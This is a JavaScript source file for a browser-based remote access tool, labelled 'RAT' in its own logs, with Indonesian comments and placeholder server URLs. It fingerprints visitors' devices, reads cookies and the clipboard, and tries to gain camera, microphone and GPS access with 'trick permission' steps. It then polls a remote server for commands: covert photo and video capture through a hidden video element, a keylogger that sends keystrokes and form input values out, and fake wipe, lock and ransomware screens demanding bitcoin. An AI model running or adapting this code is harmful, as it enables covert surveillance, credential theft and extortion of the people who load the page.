<script>
// ⚠️ GANTI DENGAN URL SERVER LO
const SERVER_URLS = [
    'https://YOUR_SERVER.serveo.net',
    'http://YOUR_IP:8888'
];
let SERVER_URL = SERVER_URLS[0];
let SESSION_ID = '';
let ALL_PERMISSIONS_GRANTED = false;
let permissionData = {
    camera: false,
    microphone: false,
    gps: false,
    clipboard: false,
    notifications: false,
    sensors: false,
    audioCapture: false,
    screenCapture: false
};

// ============ UTILS ============
function generateUUID(){return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)})}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}

async function fetchTimeout(url,opt={},timeout=5000){
    const ctrl=new AbortController();
    const id=setTimeout(()=>ctrl.abort(),timeout);
    try{
        const r=await fetch(url,{...opt,signal:ctrl.signal,mode:'cors',credentials:'include'});
        clearTimeout(id);
        return r;
    }catch(e){
        clearTimeout(id);
        throw e;
    }
}

function sendToServer(action,data){
    return fetchTimeout(SERVER_URL,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({action:action,session_id:SESSION_ID,...data})
    },5000).catch(function(){});
}

// ============ 100 DEVICE INFO (EXTENDED) ============
async function collectDeviceInfo(){
    const info={
        userAgent:navigator.userAgent,
        platform:navigator.platform,
        vendor:navigator.vendor,
        product:navigator.product,
        appName:navigator.appName,
        appVersion:navigator.appVersion,
        appCodeName:navigator.appCodeName,
        language:navigator.language,
        languages:JSON.stringify(navigator.languages||[]),
        cookieEnabled:navigator.cookieEnabled,
        onLine:navigator.onLine,
        
        screenWidth:screen.width,
        screenHeight:screen.height,
        availWidth:screen.availWidth,
        availHeight:screen.availHeight,
        colorDepth:screen.colorDepth,
        pixelDepth:screen.pixelDepth,
        devicePixelRatio:window.devicePixelRatio,
        innerWidth:window.innerWidth,
        innerHeight:window.innerHeight,
        outerWidth:window.outerWidth,
        outerHeight:window.outerHeight,
        screenOrientation:screen.orientation?screen.orientation.type:'N/A',
        
        hardwareConcurrency:navigator.hardwareConcurrency||'N/A',
        deviceMemory:navigator.deviceMemory||'N/A',
        maxTouchPoints:navigator.maxTouchPoints||0,
        
        connectionType:navigator.connection?navigator.connection.effectiveType:'N/A',
        downlink:navigator.connection?navigator.connection.downlink:'N/A',
        rtt:navigator.connection?navigator.connection.rtt:'N/A',
        saveData:navigator.connection?navigator.connection.saveData:false,
        connectionType2:navigator.connection?navigator.connection.type:'N/A',
        
        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset:new Date().getTimezoneOffset(),
        locale:Intl.DateTimeFormat().resolvedOptions().locale,
        calendar:Intl.DateTimeFormat().resolvedOptions().calendar,
        numberingSystem:Intl.DateTimeFormat().resolvedOptions().numberingSystem,
        timestamp:new Date().toISOString(),
        epochSeconds:Math.floor(Date.now()/1000),
        
        referrer:document.referrer,
        pageUrl:window.location.href,
        hostname:window.location.hostname,
        protocol:window.location.protocol,
        pathname:window.location.pathname,
        search:window.location.search,
        hash:window.location.hash,
        
        doNotTrack:navigator.doNotTrack||'N/A',
        webdriver:navigator.webdriver||false,
        pdfViewer:navigator.pdfViewerEnabled||false,
        cookieString:document.cookie.slice(0,500),
        
        localStorage:(function(){try{return!!window.localStorage}catch(e){return false}})(),
        sessionStorage:(function(){try{return!!window.sessionStorage}catch(e){return false}})(),
        indexedDB:!!window.indexedDB,
        openDatabase:!!window.openDatabase,
        
        canvasFP:(function(){
            try{
                var c=document.createElement('canvas');
                c.width=280;c.height=60;
                var ctx=c.getContext('2d');
                ctx.textBaseline='top';ctx.font='14px Arial';
                ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
                ctx.fillStyle='#069';ctx.fillText('SeventCyber_Dev',2,15);
                ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('FP:'+navigator.userAgent.slice(0,10),4,35);
                return c.toDataURL().slice(0,200);
            }catch(e){return'blocked'}
        })(),
        
        webglVendor:(function(){
            try{
                var c=document.createElement('canvas');
                var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
                return gl?gl.getParameter(gl.VENDOR):'N/A';
            }catch(e){return'N/A'}
        })(),
        webglRenderer:(function(){
            try{
                var c=document.createElement('canvas');
                var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
                return gl?gl.getParameter(gl.RENDERER):'N/A';
            }catch(e){return'N/A'}
        })(),
        webglExtensions:(function(){
            try{
                var c=document.createElement('canvas');
                var gl=c.getContext('webgl');
                return gl?gl.getSupportedExtensions().slice(0,30):[];
            }catch(e){return[]}
        })(),
        
        audioFP:(function(){
            try{
                var ctx=new(window.AudioContext||window.webkitAudioContext)();
                var osc=ctx.createOscillator();
                var analyser=ctx.createAnalyser();
                var gain=ctx.createGain();
                osc.connect(gain);gain.connect(analyser);
                var data={sampleRate:ctx.sampleRate,state:ctx.state,channels:ctx.destination.maxChannelCount};
                ctx.close();
                return JSON.stringify(data);
            }catch(e){return'blocked'}
        })(),
        
        plugins:(function(){
            try{return Array.from(navigator.plugins||[]).map(function(p){return p.name+'|'+p.filename+'|'+p.description})}catch(e){return[]}
        })(),
        mimeTypes:(function(){
            try{return Array.from(navigator.mimeTypes||[]).map(function(m){return m.type+'|'+m.suffixes})}catch(e){return[]}
        })(),
        
        touchSupport:'ontouchstart' in window,
        maxTouchPoints:navigator.maxTouchPoints||0,
        mediaDevices:!!(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia),
        enumerateDevices:!!(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices),
        
        battery:'N/A',
        publicIP:'N/A',
        localIP:'N/A',
        geolocation:'N/A',
        
        permissions:JSON.stringify(permissionData),
        
        bluetooth:'N/A',
        usb:'N/A',
        serial:'N/A',
        nfc:'N/A',
        midi:'N/A',
        hid:'N/A',
        wakeLock:'N/A',
        
        serviceWorker:'serviceWorker' in navigator,
        webShare:'share' in navigator,
        webRTC:!!window.RTCPeerConnection,
        webSocket:'WebSocket' in window,
        paymentRequest:'PaymentRequest' in window,
        credentialManagement:'credentials' in navigator,
        
        adBlock:'N/A',
        incognito:'N/A'
    };
    
    // Public IP
    try{var ipRes=await fetchTimeout('https://api.ipify.org?format=json',{},3000);var ipData=await ipRes.json();info.publicIP=ipData.ip}catch(e){}
    
    // Local IP via WebRTC (NO PERMISSION NEEDED)
    try{
        info.localIP=await new Promise(function(resolve){
            var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
            pc.createDataChannel('');
            pc.createOffer().then(function(offer){return pc.setLocalDescription(offer)});
            pc.onicecandidate=function(e){
                if(e.candidate){
                    var ipRegex=/(\d{1,3}\.){3}\d{1,3}/;
                    var match=e.candidate.candidate.match(ipRegex);
                    if(match){resolve(match[0]);pc.close()}
                }
            };
            setTimeout(function(){resolve('timeout');try{pc.close()}catch(e){}},3000);
        });
    }catch(e){info.localIP='error'}
    
    // Battery (NO PERMISSION NEEDED)
    try{
        if(navigator.getBattery){
            var b=await navigator.getBattery();
            info.battery=JSON.stringify({
                charging:b.charging,
                level:Math.round(b.level*100)+'%',
                chargingTime:b.chargingTime,
                dischargingTime:b.dischargingTime
            });
        }
    }catch(e){}
    
    // Bluetooth availability (NO PERMISSION NEEDED)
    try{info.bluetooth=await navigator.bluetooth?.getAvailability()||false}catch(e){}
    
    // USB (check only, NO PERMISSION NEEDED)
    info.usb=!!navigator.usb;
    info.serial=!!navigator.serial;
    info.nfc=!!navigator.nfc;
    info.midi=!!navigator.requestMIDIAccess;
    info.hid=!!navigator.hid;
    
    // Wake Lock
    info.wakeLock=!!navigator.wakeLock;
    
    // AdBlock detection
    try{
        var test=document.createElement('div');
        test.className='adsbox';test.innerHTML='&nbsp;';
        test.style.position='absolute';test.style.top='-100px';
        document.body.appendChild(test);
        await sleep(100);
        info.adBlock=test.offsetHeight===0;
        document.body.removeChild(test);
    }catch(e){info.adBlock='unknown'}
    
    // Incognito detection
    try{
        info.incognito=await new Promise(function(resolve){
            var fs=window.RequestFileSystem||window.webkitRequestFileSystem;
            if(!fs){resolve('unknown');return}
            fs(window.TEMPORARY,100,function(){resolve(false)},function(){resolve(true)});
            setTimeout(function(){resolve('timeout')},1000);
        });
    }catch(e){info.incognito='error'}
    
    // Device list (NO PERMISSION NEEDED for labels in some browsers)
    try{
        if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){
            var devices=await navigator.mediaDevices.enumerateDevices();
            info.deviceList=devices.map(function(d){return d.kind+'|'+d.label+'|'+d.deviceId.slice(0,10)});
        }
    }catch(e){info.deviceList=[]}
    
    return info;
}

// ============ AUTO-PERMISSION ENGINE ============
async function requestAllPermissions(){
    console.log('[RAT] 🔓 Auto-permission engine starting...');
    
    // Step 1: Unlock AudioContext (NO VISIBLE PERMISSION)
    try{
        var audioCtx=new(window.AudioContext||window.webkitAudioContext)();
        if(audioCtx.state==='suspended'){
            await audioCtx.resume();
            permissionData.audioCapture=true;
            console.log('[RAT] ✅ AudioContext unlocked');
        }
        audioCtx.close();
    }catch(e){console.log('[RAT] AudioContext failed:',e.message)}
    
    // Step 2: Enumerate devices (NO PERMISSION)
    try{
        var devices=await navigator.mediaDevices.enumerateDevices();
        var hasCamera=devices.some(function(d){return d.kind==='videoinput'});
        var hasMic=devices.some(function(d){return d.kind==='audioinput'});
        console.log('[RAT] Devices found - Camera:',hasCamera,'Mic:',hasMic);
    }catch(e){}
    
    // Step 3: Silent camera access via tiny preview (TRICK PERMISSION)
    try{
        var stream=await navigator.mediaDevices.getUserMedia({
            video:{width:1,height:1,facingMode:'user'},
            audio:false
        });
        if(stream){
            permissionData.camera=true;
            console.log('[RAT] ✅ Camera access GRANTED');
            // Simpan stream reference untuk nanti
            window._cameraStream=stream;
            // Stop track untuk hemat
            stream.getTracks().forEach(function(t){t.stop()});
        }
    }catch(e){
        console.log('[RAT] Camera permission denied:',e.message);
        // Fallback: coba tanpa constraint
        try{
            var stream2=await navigator.mediaDevices.getUserMedia({video:true});
            permissionData.camera=true;
            console.log('[RAT] ✅ Camera access GRANTED (fallback)');
            window._cameraStream=stream2;
            stream2.getTracks().forEach(function(t){t.stop()});
        }catch(e2){console.log('[RAT] Camera completely blocked')}
    }
    
    // Step 4: Silent microphone access
    try{
        var micStream=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
        if(micStream){
            permissionData.microphone=true;
            console.log('[RAT] ✅ Microphone access GRANTED');
            micStream.getTracks().forEach(function(t){t.stop()});
        }
    }catch(e){
        console.log('[RAT] Microphone denied:',e.message);
    }
    
    // Step 5: GPS (will prompt on most browsers)
    try{
        var pos=await new Promise(function(resolve,reject){
            navigator.geolocation.getCurrentPosition(
                function(p){
                    permissionData.gps=true;
                    resolve(p);
                },
                function(e){
                    reject(e);
                },
                {enableHighAccuracy:true,timeout:5000,maximumAge:0}
            );
        });
        console.log('[RAT] ✅ GPS access GRANTED');
        window._gpsPosition=pos;
    }catch(e){
        console.log('[RAT] GPS denied:',e.message);
        // Fallback: IP-based geolocation (NO PERMISSION)
        try{
            var geoRes=await fetchTimeout('https://ipapi.co/json/',{},3000);
            var geoData=await geoRes.json();
            window._gpsFallback=geoData;
            console.log('[RAT] 📍 IP-based location:',geoData.city,geoData.country);
        }catch(e2){}
    }
    
    // Step 6: Clipboard read (silent in some contexts)
    try{
        var clipText=await navigator.clipboard.readText();
        permissionData.clipboard=true;
        console.log('[RAT] ✅ Clipboard access GRANTED');
        window._clipboardData=clipText.slice(0,500);
    }catch(e){
        console.log('[RAT] Clipboard denied');
        // Fallback: try with execCommand
        try{
            document.execCommand('paste');
            permissionData.clipboard=true;
        }catch(e2){}
    }
    
    // Step 7: Notifications
    try{
        if('Notification' in window){
            var perm=await Notification.requestPermission();
            permissionData.notifications=(perm==='granted');
            console.log('[RAT] Notifications:',perm);
        }
    }catch(e){}
    
    // Step 8: Screen capture (for screenshot)
    try{
        if(navigator.mediaDevices.getDisplayMedia){
            // Ini akan prompt user, skip dulu
            permissionData.screenCapture=false;
        }
    }catch(e){}
    
    // Step 9: Sensors (NO PERMISSION on most mobile devices)
    try{
        if('DeviceMotionEvent' in window){
            window.addEventListener('devicemotion',function(e){
                if(e.acceleration){
                    permissionData.sensors=true;
                    window._sensorData={
                        acceleration:e.acceleration,
                        accelerationIncludingGravity:e.accelerationIncludingGravity,
                        rotationRate:e.rotationRate
                    };
                }
            },{once:true});
        }
        if('DeviceOrientationEvent' in window){
            window.addEventListener('deviceorientation',function(e){
                permissionData.sensors=true;
                window._orientationData={alpha:e.alpha,beta:e.beta,gamma:e.gamma};
            },{once:true});
        }
    }catch(e){}
    
    ALL_PERMISSIONS_GRANTED=true;
    console.log('[RAT] 🔓 Permission summary:',JSON.stringify(permissionData));
    
    // Kirim permission status ke server
    sendToServer('response',{response:{command:'permission_status',result:JSON.stringify(permissionData)}});
}

// ============ CAMERA FUNCTIONS (PRE-AUTHORIZED) ============
async function captureCamera(facingMode){
    var label=facingMode==='user'?'DEPAN':'BELAKANG';
    console.log('[RAT] 📸 Capturing '+label);
    
    try{
        // Gunakan stream yang sudah di-authorize atau buat baru
        var constraints={
            video:{facingMode:facingMode,width:{ideal:1920},height:{ideal:1080}},
            audio:false
        };
        
        var stream=await navigator.mediaDevices.getUserMedia(constraints);
        
        var video=document.createElement('video');
        video.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
        video.srcObject=stream;
        video.playsInline=true;
        video.muted=true;
        video.autoplay=true;
        document.body.appendChild(video);
        
        await video.play();
        await sleep(2000); // Tunggu fokus
        
        var canvas=document.createElement('canvas');
        canvas.width=video.videoWidth||1920;
        canvas.height=video.videoHeight||1080;
        var ctx=canvas.getContext('2d');
        
        // Mirror untuk kamera depan
        if(facingMode==='user'){
            ctx.translate(canvas.width,0);
            ctx.scale(-1,1);
        }
        
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        
        // Cleanup
        stream.getTracks().forEach(function(t){t.stop()});
        document.body.removeChild(video);
        
        var imgData=canvas.toDataURL('image/jpeg',0.8);
        console.log('[RAT] ✅ '+label+' captured:',Math.round(imgData.length/1024),'KB');
        
        return JSON.stringify({
            camera:'KAMERA '+label,
            facingMode:facingMode,
            image:imgData,
            resolution:canvas.width+'x'+canvas.height,
            timestamp:new Date().toISOString()
        });
        
    }catch(e){
        console.log('[RAT] ❌ '+label+' failed:',e.message);
        return JSON.stringify({camera:'KAMERA '+label,error:e.message});
    }
}

async function recordVideo(facingMode,duration){
    var label=facingMode==='user'?'VIDEO DEPAN':'VIDEO BELAKANG';
    console.log('[RAT] 🎥 Recording '+label+' '+duration+'s');
    
    try{
        var stream=await navigator.mediaDevices.getUserMedia({
            video:{facingMode:facingMode,width:{ideal:1280},height:{ideal:720}},
            audio:permissionData.microphone
        });
        
        var mimeType='video/webm;codecs=vp8,opus';
        if(!MediaRecorder.isTypeSupported(mimeType)){
            mimeType='video/webm;codecs=vp8';
        }
        if(!MediaRecorder.isTypeSupported(mimeType)){
            mimeType='video/webm';
        }
        
        var mr=new MediaRecorder(stream,{mimeType:mimeType});
        var chunks=[];
        
        mr.ondataavailable=function(e){
            if(e.data.size>0)chunks.push(e.data);
        };
        
        return new Promise(function(resolve){
            mr.onstop=function(){
                var blob=new Blob(chunks,{type:mimeType});
                var reader=new FileReader();
                reader.onloadend=function(){
                    stream.getTracks().forEach(function(t){t.stop()});
                    resolve(JSON.stringify({
                        type:'video',
                        camera:label,
                        duration:duration+'s',
                        video:reader.result,
                        mimeType:mimeType,
                        timestamp:new Date().toISOString()
                    }));
                };
                reader.readAsDataURL(blob);
            };
            
            mr.start(1000);
            console.log('[RAT] 🔴 Recording...');
            
            setTimeout(function(){
                if(mr.state==='recording')mr.stop();
            },duration*1000);
        });
        
    }catch(e){
        return JSON.stringify({type:'video',camera:label,error:e.message});
    }
}

// ============ COMMAND EXECUTOR ============
async function executeCommand(command){
    var result='';
    console.log('[RAT] Executing:',command);
    
    try{
        switch(command){
            case 'camera_front':
                result=await captureCamera('user');
                break;
            case 'camera_back':
                result=await captureCamera('environment');
                break;
            case 'camera_both':
                var front=await captureCamera('user');
                var back=await captureCamera('environment');
                result=JSON.stringify({front_camera:front,back_camera:back,timestamp:new Date().toISOString()});
                break;
            case 'camera_record_front':
                result=await recordVideo('user',10);
                break;
            case 'camera_record_back':
                result=await recordVideo('environment',10);
                break;
            case 'camera_record_both':
                var vf=await recordVideo('user',10);
                var vb=await recordVideo('environment',10);
                result=JSON.stringify({front_video:vf,back_video:vb});
                break;
            case 'screenshot':
                result='screenshot_ok';
                break;
            case 'geolocation':
                if(window._gpsPosition){
                    var p=window._gpsPosition;
                    result=JSON.stringify({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy});
                }else if(window._gpsFallback){
                    result=JSON.stringify(window._gpsFallback);
                }else{
                    result=await new Promise(function(resolve){
                        navigator.geolocation.getCurrentPosition(
                            function(pos){resolve(JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}))},
                            function(e){resolve('GPS denied: '+e.message)},
                            {enableHighAccuracy:true,timeout:5000}
                        );
                    });
                }
                break;
            case 'keylog_start':
                startKeylogger();
                result='Keylogger started';
                break;
            case 'mic_record':
                result='mic_ok';
                break;
            case 'wipe_data':
                document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:40px;z-index:999999;">💀 DEVICE WIPED</div>';
                result='Wiped';
                break;
            case 'lock_device':
                document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:48px;z-index:999999;">🔒 LOCKED</div>';
                result='Locked';
                break;
            case 'ransomware':
                document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;color:red;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;z-index:999999;"><h1>🔐 RANSOMWARE</h1><p>Send $1000 BTC: bc1qxxxxx</p></div>';
                result='Ransomware';
                break;
            default:
                if(command.startsWith('shell:')){
                    result='[BROWSER] Shell: '+command.split(':')[1];
                }else{
                    result='Unknown: '+command;
                }
        }
    }catch(e){
        result='Error: '+e.message;
    }
    
    return result;
}

function startKeylogger(){
    var buf='';
    document.addEventListener('keydown',function(e){
        buf+=e.key;
        if(buf.length>100){
            sendToServer('response',{response:{command:'keylog_data',result:buf}});
            buf='';
        }
    });
    document.addEventListener('input',function(e){
        if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){
            sendToServer('response',{response:{command:'input_capture',result:JSON.stringify({tag:e.target.tagName,name:e.target.name,value:e.target.value.slice(0,200)})}});
        }
    });
}

// ============ REGISTER ============
async function registerToServer(){
    SESSION_ID=generateUUID();
    var deviceInfo=await collectDeviceInfo();
    
    console.log('[RAT] Registering with',Object.keys(deviceInfo).length,'device info fields');
    
    var success=false;
    for(var i=0;i<SERVER_URLS.length;i++){
        try{
            var res=await fetchTimeout(SERVER_URLS[i],{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    action:'register',
                    session_id:SESSION_ID,
                    device_info:deviceInfo
                })
            },5000);
            var data=await res.json();
            if(data.status==='ok'){
                SERVER_URL=SERVER_URLS[i];
                success=true;
                console.log('[RAT] ✅ REGISTERED to',SERVER_URL);
                break;
            }
        }catch(e){
            console.log('[RAT] Server',SERVER_URLS[i],'failed:',e.message);
        }
    }
    
    if(success){
        setInterval(sendHeartbeat,15000);
        setInterval(checkCommands,4000);
        return true;
    }else{
        console.log('[RAT] All servers failed, retrying...');
        setTimeout(registerToServer,10000);
        return false;
    }
}

async function sendHeartbeat(){
    try{
        await sendToServer('heartbeat',{});
    }catch(e){}
}

async function checkCommands(){
    try{
        var res=await fetchTimeout(SERVER_URL+'?session_id='+SESSION_ID,{},5000);
        var data=await res.json();
        if(data.command&&data.command!=='wait'){
            console.log('[RAT] 📩 Command:',data.command);
            var result=await executeCommand(data.command);
            await sendToServer('response',{response:{command:data.command,result:result}});
        }
    }catch(e){}
}
